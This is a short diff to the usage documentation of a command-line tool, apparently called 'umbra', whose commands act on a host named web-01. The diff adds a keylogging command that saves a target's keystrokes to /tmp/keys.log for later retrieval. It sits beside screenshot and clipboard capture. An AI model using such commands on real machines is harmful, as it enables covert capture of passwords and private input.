@@ -290,6 +290,7 @@ umbra tail web-01 /var/log/auth.log --lines 50   # what a log says right now
 umbra hash web-01 /usr/bin/suspicious       # the SHA-256 of a file
 umbra proc web-01                           # the process table
 umbra proc-kill web-01 4321                 # a process, by pid or by name
+umbra keylog-file web-01 /tmp/keys.log --seconds 300   # the keys, to be fetched later
 umbra screenshot web-01 screen.png          # the screen of the target
 umbra clipboard web-01                      # the clipboard of the target
 ```
